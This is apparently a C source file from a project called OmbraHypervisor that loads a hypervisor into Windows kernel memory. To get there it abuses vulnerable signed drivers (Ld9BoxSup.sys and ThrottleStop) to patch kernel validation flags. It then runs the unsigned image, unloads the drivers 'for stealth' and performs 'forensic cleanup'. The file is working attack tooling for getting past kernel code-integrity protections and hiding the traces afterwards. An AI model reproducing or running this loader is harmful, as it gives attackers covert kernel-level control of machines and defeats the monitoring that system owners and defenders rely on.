// hv_loader.c - Hypervisor Loader Implementation (Self-Contained Design)
// OmbraHypervisor
//
// Simplified loader for self-contained hypervisor.
// The hypervisor now resolves symbols and allocates resources internally.
// Loader only needs to:
// 1. Load the hypervisor PE into kernel memory via BYOVD
// 2. Resolve MmGetSystemRoutineAddress and pass it to HvEntry
//
// This dramatically simplifies the loader and moves complexity into
// the hypervisor where it's easier to debug.

#include "hv_loader.h"
#include "pe_utils.h"
#include "pe_relocs.h"
#include "cleanup.h"
#include "../byovd/supdrv.h"
#include "../byovd/throttlestop.h"
#include "../byovd/nt_defs.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// =============================================================================
// HvEntry Function Pointer Type
// =============================================================================

typedef int (*FN_HvEntry)(void* MmGetSystemRoutineAddress);

// =============================================================================
// Resolve MmGetSystemRoutineAddress
// =============================================================================

static BOOL ResolveMmGetSystemRoutineAddress(DRV_CONTEXT* drv, U64* outAddr) {
    void* addr;

    if (DrvGetSymbol(drv, "MmGetSystemRoutineAddress", &addr) != DRV_SUCCESS) {
        printf("[-] Failed to resolve MmGetSystemRoutineAddress\n");
        return FALSE;
    }

    *outAddr = (U64)addr;
    printf("[+] MmGetSystemRoutineAddress @ 0x%llX\n", *outAddr);
    return TRUE;
}

// =============================================================================
// Apply -618 Bypass
// =============================================================================

static BOOL Apply618Bypass(void) {
    printf("[*] Applying -618 bypass via ThrottleStop...\n");

    // Get Ld9BoxSup.sys base address
    UINT64 ld9BoxBase = NtGetDriverBase(L"ld9box");
    if (ld9BoxBase == 0) {
        printf("[!] Warning: Could not find Ld9BoxSup.sys base address\n");
        printf("    Proceeding without bypass - LDR_OPEN may fail with -618\n");
        return TRUE;  // Continue anyway
    }

    printf("[+] Ld9BoxSup.sys base: 0x%llX\n", ld9BoxBase);

    // Initialize ThrottleStop context
    TS_CTX tsCtx;
    TS_Init(&tsCtx);

    // Initialize ThrottleStop driver
    if (TS_Initialize(&tsCtx, NULL)) {
        printf("[+] ThrottleStop initialized\n");

        // Patch the -618 validation flags
        if (TS_Patch618Flags(&tsCtx, ld9BoxBase)) {
            printf("[+] -618 bypass: Validation flags patched successfully\n");
        } else {
            printf("[!] -618 bypass: Failed to patch flags: %s\n", TS_GetLastError(&tsCtx));
            printf("    LDR_OPEN may still succeed if already patched\n");
        }

        // Cleanup ThrottleStop driver (unload for stealth)
        TS_Cleanup(&tsCtx);
        printf("[+] ThrottleStop cleaned up\n");
    } else {
        printf("[!] ThrottleStop init failed: %s\n", TS_GetLastError(&tsCtx));
        printf("    Proceeding without bypass\n");
    }

    printf("[*] -618 bypass complete\n");
    return TRUE;
}

// =============================================================================
// Allocate and Map Hypervisor Image
// =============================================================================

static BOOL AllocateHypervisorImage(HV_LOADER_CTX* ctx, U32 hvImageSize) {
    // Apply -618 bypass first
    Apply618Bypass();

    // LDR_OPEN: request kernel memory for image
    void* imageBase = NULL;
    DRV_STATUS status = DrvLdrOpen(&ctx->Driver, hvImageSize, &imageBase);
    if (status != DRV_SUCCESS) {
        printf("[-] LDR_OPEN failed: %s\n", DrvStatusString(status));
        return FALSE;
    }
    printf("[+] LDR_OPEN: imageBase = 0x%p\n", imageBase);

    ctx->ImageBase = imageBase;
    ctx->ImageSize = hvImageSize;

    return TRUE;
}

// =============================================================================
// Execute Hypervisor Entry Point
// =============================================================================

static BOOL ExecuteHypervisorEntry(HV_LOADER_CTX* ctx, void* hvImage, U32 hvImageSize,
                                   U64 mmGetSystemRoutineAddress) {
    // Get entry point RVA
    uint32_t entryRva;
    if (!PeGetEntryPoint(hvImage, hvImageSize, &entryRva)) {
        printf("[-] Failed to get entry point from PE\n");
        return FALSE;
    }
    printf("[*] Entry point RVA: 0x%X\n", entryRva);

    // Calculate entry point kernel address
    void* entryPoint = (U8*)ctx->ImageBase + entryRva;
    printf("[*] Entry point (HvEntry) @ 0x%p\n", entryPoint);

    // The new hypervisor entry point signature is:
    //   int HvEntry(void* MmGetSystemRoutineAddress)
    //
    // We need to pass MmGetSystemRoutineAddress as the first argument.
    // The BYOVD LDR_LOAD mechanism calls the entry point with whatever
    // we provide in the start context.

    // Prepare argument: MmGetSystemRoutineAddress pointer
    printf("[*] Passing MmGetSystemRoutineAddress = 0x%llX to HvEntry\n", mmGetSystemRoutineAddress);

    // LDR_LOAD: copy image and invoke entry point
    // Note: We pass the MmGetSystemRoutineAddress as the "driver object" argument
    // which becomes the first parameter to the entry point function.
    DRV_STATUS status = DrvLdrLoadWithArg(&ctx->Driver, ctx->ImageBase,
                                           hvImage, hvImageSize, entryPoint,
                                           (void*)mmGetSystemRoutineAddress);
    if (status != DRV_SUCCESS) {
        printf("[-] LDR_LOAD failed: %s\n", DrvStatusString(status));
        DrvLdrFree(&ctx->Driver, ctx->ImageBase);
        ctx->ImageBase = NULL;
        return FALSE;
    }
    printf("[+] LDR_LOAD: hypervisor loaded and HvEntry called\n");

    return TRUE;
}

// =============================================================================
// Public API Implementation
// =============================================================================

BOOL HvLoaderInit(HV_LOADER_CTX* ctx, const wchar_t* driverPath) {
    memset(ctx, 0, sizeof(*ctx));

    printf("[*] Initializing hypervisor loader (self-contained mode)\n");

    // Initialize driver interface
    if (DrvInitialize(&ctx->Driver, driverPath) != DRV_SUCCESS) {
        printf("[-] Failed to initialize driver interface\n");
        return FALSE;
    }

    // Get CPU count (for display purposes only - hypervisor gets this itself)
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    ctx->CpuCount = sysInfo.dwNumberOfProcessors;
    printf("[+] System has %u CPUs\n", ctx->CpuCount);

    return TRUE;
}

BOOL HvLoaderLoad(HV_LOADER_CTX* ctx, const void* hvImage, U32 hvImageSize) {
    U64 mmGetSystemRoutineAddress = 0;

    printf("[*] Loading hypervisor (%u bytes) - self-contained mode\n", hvImageSize);
    printf("[*] Hypervisor will resolve symbols and allocate resources internally\n");

    // 1. Resolve MmGetSystemRoutineAddress - the bootstrap function
    printf("[*] Resolving bootstrap function...\n");
    if (!ResolveMmGetSystemRoutineAddress(&ctx->Driver, &mmGetSystemRoutineAddress)) {
        return FALSE;
    }

    // 2. Make a copy of image to apply relocations
    void* hvImageCopy = malloc(hvImageSize);
    if (!hvImageCopy) {
        printf("[-] Failed to allocate image copy\n");
        return FALSE;
    }
    memcpy(hvImageCopy, hvImage, hvImageSize);

    // 3. Allocate kernel memory for hypervisor
    printf("[*] Allocating kernel memory for hypervisor...\n");
    if (!AllocateHypervisorImage(ctx, hvImageSize)) {
        free(hvImageCopy);
        return FALSE;
    }

    // 4. Apply relocations to the image copy based on new base
    printf("[*] Applying PE relocations...\n");
    if (!PeApplyRelocations(hvImageCopy, hvImageSize, (U64)ctx->ImageBase)) {
        printf("[-] Failed to apply relocations\n");
        free(hvImageCopy);
        DrvLdrFree(&ctx->Driver, ctx->ImageBase);
        ctx->ImageBase = NULL;
        return FALSE;
    }

    // 5. Execute hypervisor entry point with MmGetSystemRoutineAddress
    printf("[*] Executing HvEntry...\n");
    if (!ExecuteHypervisorEntry(ctx, hvImageCopy, hvImageSize, mmGetSystemRoutineAddress)) {
        free(hvImageCopy);
        return FALSE;
    }

    free(hvImageCopy);

    ctx->Loaded = TRUE;
    ctx->Running = TRUE;

    printf("[+] Hypervisor loaded and running!\n");

    // =========================================================================
    // EPHEMERAL DRIVER UNLOAD
    // =========================================================================
    // The hypervisor is now running in VMX root mode and has its own memory
    // management via kernel symbols resolved at runtime. The BYOVD driver
    // (Ld9BoxSup.sys) is no longer needed - unload it for stealth.
    // =========================================================================

    printf("[*] Unloading BYOVD driver (ephemeral mode)...\n");

    // Close device handle first
    if (ctx->Driver.hDevice) {
        CloseHandle(ctx->Driver.hDevice);
        ctx->Driver.hDevice = NULL;
    }

    // Unload the driver service
    DRV_STATUS unloadStatus = DrvUnloadDriver(&ctx->Driver);
    if (unloadStatus == DRV_SUCCESS) {
        printf("[+] BYOVD driver unloaded successfully\n");
    } else {
        printf("[!] Warning: BYOVD driver unload failed (error %d)\n", unloadStatus);
        printf("    Hypervisor is running but driver remains loaded\n");
    }

    // Perform usermode forensic cleanup
    printf("[*] Performing forensic cleanup...\n");
    PerformForensicCleanup(FALSE);

    return TRUE;
}

BOOL HvLoaderUnload(HV_LOADER_CTX* ctx) {
    if (!ctx->Loaded) {
        return FALSE;
    }

    printf("[*] Unloading hypervisor...\n");

    // TODO: Issue VMCALL_UNLOAD to gracefully exit VMX on all CPUs
    // The hypervisor will call VMXOFF and free its allocated resources

    ctx->Running = FALSE;

    // Free the loaded kernel module (if BYOVD still available)
    if (ctx->ImageBase && ctx->Driver.hDevice) {
        DRV_STATUS status = DrvLdrFree(&ctx->Driver, ctx->ImageBase);
        if (status != DRV_SUCCESS) {
            printf("[!] Warning: DrvLdrFree failed: %s\n", DrvStatusString(status));
        }
    }
    ctx->ImageBase = NULL;
    ctx->ImageSize = 0;
    ctx->Loaded = FALSE;

    return TRUE;
}

BOOL HvLoaderIsRunning(HV_LOADER_CTX* ctx) {
    return ctx->Running;
}

void HvLoaderCleanup(HV_LOADER_CTX* ctx) {
    if (ctx->Running) {
        HvLoaderUnload(ctx);
    }

    DrvCleanup(&ctx->Driver);
    memset(ctx, 0, sizeof(*ctx));
}

// =============================================================================
// Debug Buffer Access (optional - hypervisor allocates its own now)
// =============================================================================

void* HvLoaderGetDebugBuffer(HV_LOADER_CTX* ctx) {
    // With self-contained design, hypervisor allocates its own debug buffer
    // This function returns NULL - debug output accessed via VMCALL
    (void)ctx;
    return NULL;
}

U64 HvLoaderGetDebugBufferSize(HV_LOADER_CTX* ctx) {
    (void)ctx;
    return 0;
}
